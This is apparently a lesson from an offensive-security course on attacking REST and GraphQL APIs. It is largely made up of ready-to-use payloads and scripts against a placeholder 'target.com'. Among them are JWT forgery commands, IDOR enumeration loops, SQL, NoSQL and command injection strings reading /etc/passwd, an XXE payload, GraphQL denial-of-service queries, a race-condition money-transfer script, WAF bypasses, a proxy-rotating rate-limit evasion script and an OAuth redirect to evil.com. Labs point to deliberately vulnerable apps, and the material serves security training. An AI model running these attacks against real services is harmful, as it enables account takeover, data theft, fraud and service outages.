# Lesson 17: API Security and Attacks

## Overview
APIs (Application Programming Interfaces) are the backbone of modern applications. REST and GraphQL APIs expose backend functionality that traditional web app scanners miss. This lesson covers API-specific attack vectors and exploitation techniques.

## API Fundamentals

### REST API Structure
```
GET /api/v1/users/123        # Retrieve user
POST /api/v1/users           # Create user  
PUT /api/v1/users/123        # Update user
DELETE /api/v1/users/123     # Delete user
PATCH /api/v1/users/123      # Partial update
```

### GraphQL Structure
```graphql
query {
  user(id: "123") {
    name
    email
    posts {
      title
      content
    }
  }
}

mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

## Reconnaissance

### API Discovery
```bash
# Find API endpoints in JavaScript files
grep -r "api/" *.js
grep -r "/v1/" *.js
grep -r "graphql" *.js

# Common API paths
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/query
/api-docs
/swagger
/swagger.json
/openapi.json
/swagger-ui.html
/.well-known/

# Subdomain enumeration for APIs
api.target.com
api-dev.target.com
api-staging.target.com
internal-api.target.com
graphql.target.com
```

### API Documentation Discovery
```bash
# Swagger/OpenAPI endpoints
curl https://target.com/swagger.json
curl https://target.com/api-docs
curl https://target.com/v2/api-docs
curl https://target.com/.well-known/openapi.json

# GraphQL introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Download full GraphQL schema
python3 graphql_introspection.py https://api.target.com/graphql
```

## Authentication Attacks

### JWT (JSON Web Token) Exploitation
```bash
# Decode JWT
echo "eyJ..." | base64 -d

# JWT manipulation with jwt_tool
jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

# Common JWT attacks
# 1. None algorithm
jwt_tool.py <token> -X a -a none

# 2. Key confusion (RS256 to HS256)
jwt_tool.py <token> -X k -pk public.pem

# 3. Weak secret brute force
jwt_tool.py <token> -C -d wordlist.txt

# 4. Kid injection
jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### API Key Security Issues
```bash
# Common API key locations
# Headers
X-API-Key: abc123
Authorization: Bearer abc123
apikey: abc123

# Query parameters
https://api.target.com/endpoint?api_key=abc123
https://api.target.com/endpoint?apikey=abc123
https://api.target.com/endpoint?key=abc123

# Find exposed API keys
# GitHub
site:github.com "api_key" site:target.com
site:github.com "x-api-key" target

# Google dorks
site:target.com filetype:js "api_key"
site:target.com filetype:json api
site:pastebin.com target.com api_key
```

### OAuth Vulnerabilities
```bash
# OAuth misconfigurations
# 1. Open redirect in redirect_uri
https://oauth.target.com/authorize?redirect_uri=https://evil.com

# 2. Authorization code reuse
# Capture code and try to reuse it

# 3. Missing state parameter (CSRF)
# Remove state parameter from OAuth flow

# 4. Token leakage in referrer
# Check if tokens appear in Referer headers
```

## Authorization Attacks

### IDOR (Insecure Direct Object Reference)
```bash
# Horizontal privilege escalation
GET /api/users/100  # Your user
GET /api/users/101  # Try other user IDs
GET /api/users/99   # Try previous IDs

# Vertical privilege escalation
GET /api/admin/users     # Try admin endpoints
GET /api/internal/debug  # Try internal endpoints

# IDOR in different parameters
/api/account?userId=123
/api/account?user_id=123  
/api/account?uid=123
/api/account?id=123
/api/account?ID=123
/api/account?account=123
/api/account?accountId=123

# IDOR with UUIDs
# Try predictable UUIDs
00000000-0000-0000-0000-000000000000
00000000-0000-0000-0000-000000000001
11111111-1111-1111-1111-111111111111

# Parameter manipulation
GET /api/transfer?from=victim&to=attacker&amount=1000
GET /api/transfer?from=attacker&to=victim&amount=-1000
```

### Privilege Escalation
```bash
# Method tampering
GET /api/admin/users → 403
POST /api/admin/users → 200
PUT /api/admin/users → 200

# Version downgrade
/api/v2/users → 403 (secured)
/api/v1/users → 200 (older, vulnerable)
/api/users → 200 (default, vulnerable)

# Add admin parameters
POST /api/register
{
  "username": "attacker",
  "password": "password",
  "role": "admin",        # Add this
  "isAdmin": true,        # Or this
  "privileges": ["admin"] # Or this
}

# HTTP verb tampering
X-HTTP-Method-Override: PUT
X-HTTP-Method: DELETE
X-Method-Override: PATCH
```

## Input Validation Attacks

### SQL Injection in APIs
```bash
# JSON SQL injection
POST /api/login
{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}

# Parameter pollution
GET /api/users?id=1&id=2' OR '1'='1

# NoSQL injection (MongoDB)
POST /api/login
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}

# GraphQL SQL injection
{
  user(id: "1' OR '1'='1") {
    name
    email
  }
}
```

### Command Injection
```bash
# API command injection
POST /api/ping
{
  "host": "8.8.8.8; cat /etc/passwd"
}

# File parameter injection
POST /api/convert
{
  "file": "../../../etc/passwd",
  "format": "pdf"
}

# Header injection
X-Forwarded-For: 127.0.0.1; whoami
User-Agent: '; system('id'); //
```

### XXE in APIs
```xml
POST /api/parse
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

## Rate Limiting and DoS

### Rate Limit Bypass
```bash
# Rotate headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# Case variation
GET /api/users
GET /api/Users
GET /api/USERS
GET /API/users

# Add null bytes or special characters
GET /api/users%00
GET /api/users%20
GET /api/users#
GET /api/users?

# Race conditions
# Send multiple requests simultaneously
for i in {1..100}; do
  curl -X POST https://api.target.com/transfer &
done
```

### GraphQL DoS
```graphql
# Deeply nested query
query {
  posts {
    author {
      posts {
        author {
          posts {
            author {
              posts {
                author {
                  name
                }
              }
            }
          }
        }
      }
    }
  }
}

# Batch query attack
query {
  user1: user(id: "1") { ...userData }
  user2: user(id: "2") { ...userData }
  user3: user(id: "3") { ...userData }
  # ... repeat 1000 times
}

fragment userData on User {
  name
  email
  posts
  comments
  likes
}

# Introspection bomb
query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              fields {
                type {
                  name
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## Business Logic Flaws

### Price Manipulation
```bash
# Negative values
POST /api/purchase
{
  "item": "product",
  "quantity": -1,
  "price": 100
}

# Integer overflow
{
  "quantity": 2147483647,
  "price": 2
}

# Decimal truncation
{
  "price": 0.001
}

# Currency confusion
{
  "price": 100,
  "currency": "JPY"  # 100 yen instead of 100 USD
}
```

### Race Conditions
```python
# Python script for race condition
import threading
import requests

def transfer():
    requests.post('https://api.target.com/transfer', 
                  json={'amount': 100, 'to': 'attacker'})

threads = []
for i in range(10):
    t = threading.Thread(target=transfer)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Workflow Bypass
```bash
# Skip payment step
POST /api/order/create → 200 {orderId: 123}
POST /api/order/123/confirm → 200  # Skip payment
GET /api/order/123/download → 200  # Get product

# Status manipulation
PUT /api/order/123
{
  "status": "paid",
  "verified": true
}
```

## Information Disclosure

### Excessive Data Exposure
```bash
# API returns too much data
GET /api/users/me
Response: {
  "username": "user",
  "email": "user@email.com",
  "password_hash": "$2b$10$...",  # Exposed
  "api_key": "secret_key_123",    # Exposed
  "internal_id": 45678,            # Exposed
  "role": "user",
  "permissions": ["read", "write"], # Exposed
  "created_at": "2021-01-01"
}

# GraphQL over-fetching
{
  users {
    id
    username
    email
    password
    creditCard
    ssn
    phoneNumber
    address
  }
}
```

### Error Message Leakage
```bash
# Verbose errors reveal information
POST /api/login
{"username": "admin", "password": "wrong"}

Response: {
  "error": "Invalid password for user admin",  # Confirms user exists
  "debug": {
    "query": "SELECT * FROM users WHERE username='admin'",
    "database": "production_db",
    "server": "192.168.1.10"
  }
}

# Stack traces
{
  "error": "TypeError: Cannot read property 'id' of null",
  "stack": "at /app/src/controllers/user.js:45:20\n at MySQL.query (/app/node_modules/mysql/lib/Connection.js:88:9)"
}
```

## Mass Assignment

### Parameter Pollution
```bash
# Add unauthorized fields
POST /api/register
{
  "username": "newuser",
  "password": "password",
  "email": "user@test.com",
  "role": "admin",         # Shouldn't be allowed
  "verified": true,        # Shouldn't be allowed
  "balance": 999999        # Shouldn't be allowed
}

# Update protected fields
PUT /api/users/profile
{
  "name": "My Name",
  "isAdmin": true,
  "accountType": "premium",
  "credits": 999999
}
```

## API Testing Tools

### Automated Scanning
```bash
# OWASP ZAP API scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.key=12345' \
  https://api.target.com

# Burp Suite API testing
# 1. Import OpenAPI/Swagger spec
# 2. Use Scanner on API endpoints
# 3. Use Intruder for fuzzing

# Nikto API scan
nikto -h https://api.target.com -Format json

# nuclei API templates
nuclei -t exposures/apis/ -u https://api.target.com
```

### API Fuzzing
```bash
# ffuf for endpoint discovery
ffuf -w /usr/share/wordlists/common-api-endpoints.txt \
  -u https://api.target.com/FUZZ \
  -mc 200,201,204,301,302,307,401,403

# Fuzzing parameters
ffuf -w params.txt \
  -u https://api.target.com/endpoint?FUZZ=test \
  -fs 0

# wfuzz for API testing
wfuzz -c -z file,wordlist.txt \
  --hc 404 \
  https://api.target.com/api/FUZZ

# APIFuzzer
python3 apifuzzer.py -s swagger.json \
  -u https://api.target.com \
  --log-level Debug
```

### GraphQL Testing
```bash
# GraphQL introspection
python3 introspection.py https://api.target.com/graphql

# graphql-cop security auditor
graphql-cop -t https://api.target.com/graphql

# BatchQL for batch attacks
python3 batch.py -e https://api.target.com/graphql \
  -q queries.txt

# GraphQLmap
python3 graphqlmap.py -u https://api.target.com/graphql \
  --introspect
```

## Practical Examples

### Example 1: Full API Attack Chain
```bash
# 1. Discover API documentation
curl https://target.com/api-docs

# 2. Find authentication endpoint
POST /api/auth/login
{"username": "test", "password": "test"}

# 3. Analyze JWT token
jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

# 4. Test for IDOR
GET /api/users/1  # Our user
GET /api/users/2  # Another user - 200 OK!

# 5. Enumerate all users
for i in {1..1000}; do
  curl -H "Authorization: Bearer $TOKEN" \
    https://api.target.com/api/users/$i
done

# 6. Find admin endpoint
GET /api/admin/users  # 403
X-HTTP-Method-Override: POST  # 200!

# 7. Escalate privileges
PUT /api/users/1
{"role": "admin"}
```

### Example 2: GraphQL Exploitation
```graphql
# 1. Introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# 2. Find interesting queries
{
  users {
    id
    email
    password  # Exposed!
    apiKey    # Exposed!
  }
}

# 3. Exploit mutations
mutation {
  updateUser(id: 1, role: "admin") {
    id
    role
  }
}

# 4. Batch attack
query {
  user1: user(id: 1) { email password }
  user2: user(id: 2) { email password }
  user3: user(id: 3) { email password }
}
```

## Defense Bypasses

### WAF Bypass for APIs
```bash
# Content-Type manipulation
Content-Type: application/json
Content-Type: text/json
Content-Type: application/x-json
Content-Type: application/ld+json

# Encoding bypasses
{"username": "admin\u0027 OR \u00271\u0027=\u00271"}  # Unicode
{"username": "admin' OR '1'='1"}  # URL encoded in JSON

# Case variation
/api/USERS  instead of /api/users
/API/users  instead of /api/users

# Add extensions
/api/users.json
/api/users.xml
/api/users.php

# HTTP method override
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
_method=DELETE (in body)
```

### Rate Limiting Evasion
```python
# Distributed attack
import requests
from concurrent.futures import ThreadPoolExecutor

proxies = [
    {'http': 'http://proxy1.com:8080'},
    {'http': 'http://proxy2.com:8080'},
    # ... more proxies
]

def make_request(proxy):
    requests.post('https://api.target.com/endpoint',
                  proxies=proxy,
                  json={'data': 'test'})

with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(make_request, proxies * 10)
```

## API Security Best Practices (Know Your Enemy)

Understanding defenses helps you identify weaknesses:

1. **Authentication**: Look for missing auth on sensitive endpoints
2. **Authorization**: Test every endpoint with different user roles
3. **Rate Limiting**: Identify endpoints without rate limits
4. **Input Validation**: Find endpoints that trust user input
5. **Encryption**: Check for endpoints using HTTP instead of HTTPS
6. **Versioning**: Old API versions often have unpatched vulnerabilities
7. **Documentation**: Exposed API docs reveal attack surface
8. **Error Handling**: Verbose errors leak sensitive information

## Lab Exercises

### Lab 1: JWT Manipulation
```bash
# Target: Juice Shop API
docker run -p 3000:3000 bkimminich/juice-shop

# 1. Login and capture JWT
# 2. Decode and modify role
# 3. Access admin endpoints
```

### Lab 2: GraphQL Introspection
```bash
# Target: DVGA (Damn Vulnerable GraphQL App)
docker run -p 5000:5000 dolevf/dvga

# 1. Perform introspection
# 2. Find hidden queries
# 3. Exploit mutations
```

### Lab 3: API Rate Limiting
```bash
# Target: Any test API
# 1. Identify rate limits
# 2. Bypass using headers
# 3. Perform race condition attack
```

## Tools and Resources

### Essential Tools
- **Burp Suite Pro**: API testing features
- **OWASP ZAP**: Free API scanner
- **Postman**: API development and testing
- **Insomnia**: REST and GraphQL client
- **jwt_tool**: JWT manipulation
- **ffuf/wfuzz**: API fuzzing
- **GraphQLmap**: GraphQL exploitation
- **Arjun**: Parameter discovery

### Wordlists
```bash
# API endpoints
/usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

# GraphQL
/usr/share/seclists/Fuzzing/GraphQL/graphql-queries.txt

# Parameters
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### API Security Testing Checklist
- [ ] Discover all API endpoints
- [ ] Check for API documentation
- [ ] Test authentication mechanisms
- [ ] Test authorization on all endpoints
- [ ] Check for IDOR vulnerabilities
- [ ] Test rate limiting
- [ ] Fuzz all parameters
- [ ] Test for injection vulnerabilities
- [ ] Check for excessive data exposure
- [ ] Test error handling
- [ ] Check for mass assignment
- [ ] Test business logic
- [ ] Check for race conditions
- [ ] Test file upload functionality
- [ ] Verify CORS configuration

This comprehensive lesson prepares you to identify and exploit API vulnerabilities in modern applications.